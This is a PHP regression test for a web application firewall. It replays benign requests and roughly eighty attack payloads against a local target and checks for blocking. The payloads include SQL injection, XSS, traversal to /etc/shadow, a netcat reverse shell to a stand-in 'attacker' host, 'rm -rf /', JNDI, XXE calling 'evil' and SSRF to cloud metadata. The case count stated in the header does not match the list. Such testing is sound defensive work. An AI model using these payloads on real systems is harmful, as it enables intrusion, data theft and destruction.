<?php
/**
 * YSL语枢-盾甲WAF
 * 作者  : 暗夜铭少
 * 邮箱  : azgq@foxmail.com
 * 网站  : https://waf.duduziy.com
 * 版权  : (c) 2026 暗夜铭少 and the YSL语枢-盾甲WAF contributors
 * 许可  : MIT -- SPDX-License-Identifier: MIT
 */

/**
 * YSL语枢-盾甲WAF · v6.2.0 统一回放验收（端到端 HTTP）
 *
 * 复刻 README「78 条端到端载荷」压测语料：12 良性 + 66 攻击，
 * 覆盖 sqli / xss / traversal(含多斜杠形态) / cmdi / ssti / jndi /
 * deser / ssrf / crlf / xxe / ldap / nosql / hpp。
 *
 * 用法（在 stressbox 容器内，目标 waflean2 已起 php -S）：
 *   php /app/tests/stress78.php [baseUrl] [mode]
 *   mode = all        跑全部，统计误报/漏放（默认）
 *   mode = benign     只跑良性（用于确定性复测：连续多次应恒为 200）
 *
 * 退出码 0 = 全过；非 0 = 有误报或漏放。
 *
 * 注意：所有 value 用原始（未编码）形式书写，由 buildUrl 统一 rawurlencode 一次，
 * 避免双重编码导致误判漏放。要测「编码穿越」本身，只需写原始 ../ 形式即可。
 */

$base = $argv[1] ?? 'http://waflean2:8080';
$mode = $argv[2] ?? 'all';

// [期望code, 标签, 参数名, 原始值(未编码)]
$cases = [

    // ============ 12 良性 / 叙述性文本（期望 200）============
    [200, '正常首页',                  '',      ''],
    [200, '正常参数',                  'id',    '12'],
    [200, 'union 数学叙述',            'q',     'The union of two sets A and B'],
    [200, 'script 文档说明',           'doc',   'The tag <script> is used to embed JavaScript in HTML'],
    [200, '说明文字变体',              'q',     '<script> is a tag used in HTML documents'],
    [200, '普通英文长句',              'q',     'Please select a shipping address for your order today'],
    [200, '文档含 documents 单词',     'q',     'HTML documents describe how to use the script element'],
    [200, '普通搜索',                  'q',     'best pizza near me open now'],
    [200, '普通页面',                  'page',  'about'],
    [200, 'benign 回调名',             'callback', 'handleData'],
    [200, '超长正常文本',              'q',     'This is a perfectly normal paragraph about web application firewalls and how they inspect incoming HTTP requests for suspicious patterns in order to protect the underlying application from common web attacks'],
    [200, '中文 SQL 教程叙述',         'q',     '本段文字包含 select、from、where 等 SQL 教程词汇，但没有攻击结构'],

    // ============ SQLi（期望 403）============
    [403, '真 SQLi',                   'id',    "1' OR 1=1--"],
    [403, '引号恒真式',                'id',    "x' OR '1'='1"],
    [403, '双引号恒真',                'id',    '1" OR "1"="1'],
    [403, '真 UNION SELECT',           'q',     'UNION SELECT password FROM users'],
    [403, '堆叠查询',                  'id',    "'; DROP TABLE users--"],
    [403, '无引号布尔注入',            'id',    '1 OR 1=1'],
    [403, '无引号布尔变体',            'id',    '1 and 2>1'],
    [403, '布尔注入带注释',            'id',    '1 OR 1=1--'],
    [403, '嵌套括号',                  'id',    '1)) OR 1=1--'],
    [403, '时间盲注 SLEEP',            'id',    "1' AND SLEEP(5)--"],
    [403, 'BENCHMARK 盲注',            'id',    "1' AND BENCHMARK(1000000,MD5(1))--"],
    [403, 'SUBSTRING 盲注',            'id',    "1' AND SUBSTRING(@@version,1,1)='5'--"],
    [403, 'INTO OUTFILE',              'id',    "1' INTO OUTFILE '/tmp/x'--"],
    [403, 'extractvalue xpath',        'id',    "1' AND extractvalue(1,concat(0x7e,version()))--"],
    [403, 'updatexml',                 'id',    "1' AND updatexml(1,concat(0x7e,database()),1)--"],
    [403, 'SQL 注释拆分绕过',          'q',     'UN/**/ION SEL/**/ECT password FROM users'],

    // ============ XSS（期望 403）============
    [403, '真 XSS script 执行',        'x',     '<script>alert(1)</script>'],
    [403, 'document.cookie 执行',      'x',     '<script>document.cookie</script>'],
    [403, 'window.location 执行',      'x',     "<script>window.location='x'</script>"],
    [403, 'img onerror',               'q',     '<img src=x onerror=alert(1)>'],
    [403, 'XSS 事件属性',              'q',     '<div onmouseover=alert(1)>hi</div>'],
    [403, 'script 说明+执行',          'q',     'The tag <script>alert(1)</script> is used in HTML'],
    [403, 'svg onload',                'q',     '<svg/onload=alert(1)>'],
    [403, 'iframe srcdoc',             'q',     "<iframe srcdoc='<script>alert(1)</script>'>"],
    [403, 'body onload',               'q',     '<body onload=alert(1)>'],
    [403, 'a href javascript',         'q',     "<a href=javascript:alert(1)>x</a>"],
    [403, 'input onfocus',             'q',     '<input onfocus=alert(1) autofocus>'],
    [403, '叙述包裹真攻击',            'q',     "The union of two sets ' OR 1=1--"],

    // ============ 路径穿越（期望 403，含多斜杠形态）============
    [403, '真 路径穿越',               'p',     '../../etc/passwd'],
    [403, 'Windows 反斜杠',            'p',     '..\..\windows\win.ini'],
    [403, 'C:\\windows 绝对路径',      'p',     'C:\windows\win.ini'],
    [403, 'C:/windows 正斜杠',         'p',     'C:/windows/win.ini'],
    [403, 'C://windows 双斜杠',        'p',     'C://windows//win.ini'],
    [403, '点填充穿越',                'p',     '....//....//boot.ini'],
    [403, '点填充混合反斜杠',          'p',     '....\\/....\\/boot.ini'],
    [403, '绝对路径嵌相对',            'p',     '/var/www/../../etc/passwd'],
    [403, '多段反斜杠',                'p',     '..\..\..\..\etc\passwd'],
    [403, '三点四段穿越',              'p',     '....//....//....//etc/passwd'],

    // ============ 命令注入（期望 403）============
    [403, '真 命令注入',               'cmd',   ';cat /etc/shadow'],
    [403, '命令链 ping',               'cmd',   '|| ping -c 1 127.0.0.1'],
    [403, 'ls 注入',                   'cmd',   '; ls -la /'],
    [403, 'rm 注入',                   'cmd',   ';rm -rf /'],
    [403, 'nc 反弹',                   'cmd',   '| nc -e /bin/sh attacker 4444'],
    [403, '反引号执行',                'cmd',   '`id`'],
    [403, '换行注入',                  'cmd',   "a\ncat /etc/passwd"],

    // ============ SSTI（期望 403）============
    [403, 'SSTI jinja',                't',     '{{7*7}}'],
    [403, 'SSTI 插值',                 't',     '${7*7}'],
    [403, 'SSTI EL',                   't',     '#{7*7}'],
    [403, 'SSTI config 探测',          't',     '{{config.items()}}'],
    [403, 'SSTI 子类遍历',             't',     '{% for x in ().__class__.__base__.__subclasses__() %}'],

    // ============ JNDI（期望 403）============
    [403, 'JNDI ldap',                 'q',     '${jndi:ldap://x/a}'],
    [403, 'JNDI rmi',                  'q',     '${jndi:rmi://x/a}'],
    [403, 'JNDI dns',                  'q',     '${jndi:dns://x}'],
    [403, 'JNDI 嵌套 env',             'q',     '${jndi:ldap://${env:USER}.x/}'],

    // ============ 反序列化（期望 403）============
    [403, 'Java 序列化 magic',          'd',     'rO0ABXSrABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=='],
    [403, 'pickle 反序列化',            'd',     'cos\nsystem\n(S"id"\ntR.'],
    [403, 'PHP 对象注入',              'd',     'O:4:"User":2:{s:4:"name";s:3:"abc";s:3:"age";i:1;}'],

    // ============ SSRF（期望 403）============
    [403, 'metadata SSRF',             'u',     'http://169.254.169.254/latest/meta-data/'],
    [403, 'gopher 协议',               'u',     'gopher://127.0.0.1:6379/_INFO'],
    [403, 'dict 协议',                 'u',     'dict://127.0.0.1:11211/stats'],
    [403, 'file 协议',                 'u',     'file:///etc/passwd'],

    // ============ CRLF（期望 403）============
    [403, 'CRLF 头注入',               'q',     "abc\r\nLocation: http://evil"],
    [403, 'CRLF + 参数污染',           'q',     "1&b=2\r\nX-Injected:1"],
    [403, 'CRLF Set-Cookie',           'q',     "x\r\nSet-Cookie: admin=1"],
    [403, '换行注入头',                'q',     "foo\nBar: baz"],

    // ============ XXE（期望 403）============
    [403, 'XXE file 读取',             'x',     '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
    [403, 'XXE 外部实体',              'x',     '<!ENTITY % xxe SYSTEM "http://evil/xxe">%xxe;'],
    [403, 'XXE win.ini',               'x',     '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'],

    // ============ LDAP 注入（期望 403）============
    [403, 'LDAP 注入骨架',             'q',     "')(cn=*)(|(objectClass=*"],
    [403, 'LDAP uid 绕过',             'q',     "*)(uid=*))(|(uid=*"],
    [403, 'LDAP password 遍历',        'q',     "*)(|(password=*"],

    // ============ NoSQL 注入（期望 403）============
    [403, 'NoSQL $gt',                 'q',     '{"$gt":""}'],
    [403, 'NoSQL $ne',                 'q',     '{"$ne":null}'],
    [403, 'NoSQL 数组绕过',            'u',     'username[$ne]=x'],
    [403, 'NoSQL regex',               'q',     'this.password[$regex]=.*'],

    // ============ HTTP 参数污染 HPP（期望 403）============
    [403, 'HPP 基础',                  'q',     'id=1&id=2&id=3'],
    [403, 'HPP 同名多值',              'q',     'name=a&name=b&name=c'],
    [403, 'HPP 多段',                  'q',     'id=1&id=2&id=3&id=4&id=5'],
];

function httpCode(string $url): int {
    $ctx = stream_context_create(['http' => [
        'ignore_errors' => true,
        'method'        => 'GET',
        'timeout'       => 15,
        'header'        => "X-Stress-Client: stress78\r\n",
    ]]);
    $body = @file_get_contents($url, false, $ctx);
    if (!isset($http_response_header[0])) {
        return 0; // 连接失败
    }
    if (preg_match('#HTTP/\S+\s+(\d{3})#i', $http_response_header[0], $m)) {
        return (int)$m[1];
    }
    return 0;
}

function buildUrl(string $base, string $name, string $value): string {
    if ($name === '') {
        return rtrim($base, '/') . '/';
    }
    return rtrim($base, '/') . '/?' . rawurlencode($name) . '=' . rawurlencode($value);
}

$runBenign = function () use ($cases, $base): array {
    $pass = $fail = 0;
    $failed = [];
    foreach ($cases as [$exp, $label, $name, $value]) {
        if ($exp !== 200) continue;
        $code = httpCode(buildUrl($base, $name, $value));
        if ($code === 200) { $pass++; }
        else { $fail++; $failed[] = "$label => 期望 200 实际 $code"; }
    }
    return [$pass, $fail, $failed];
};

$runAll = function () use ($cases, $base): array {
    $pass = $fail = 0;
    $fp = $miss = 0;
    $failed = [];
    foreach ($cases as [$exp, $label, $name, $value]) {
        $code = httpCode(buildUrl($base, $name, $value));
        if ($code === $exp) {
            $pass++;
        } else {
            $fail++;
            if ($exp === 200) { $fp++; $failed[] = "[误报] $label => 期望 200 实际 $code"; }
            else { $miss++; $failed[] = "[漏放] $label => 期望 $exp 实际 $code"; }
        }
    }
    return [$pass, $fail, $fp, $miss, $failed];
};

if ($mode === 'benign') {
    [$pass, $fail, $failed] = $runBenign();
    echo "良性复测：通过 $pass / 失败 $fail\n";
    foreach ($failed as $f) echo "  [FAIL] $f\n";
    exit($fail === 0 ? 0 : 1);
}

// mode = all
[$pass, $fail, $fp, $miss, $failed] = $runAll();
$total = count($cases);
echo "===== 回放（{$total} 条）=====\n";
echo "通过 $pass / 失败 $fail  | 误报(FP) $fp / 漏放(Miss) $miss\n";
foreach ($failed as $f) echo "  [FAIL] $f\n";
echo ($fail === 0 ? "RESULT: PASS (0 误报 / 0 漏放)\n" : "RESULT: FAIL\n");
exit($fail === 0 ? 0 : 1);
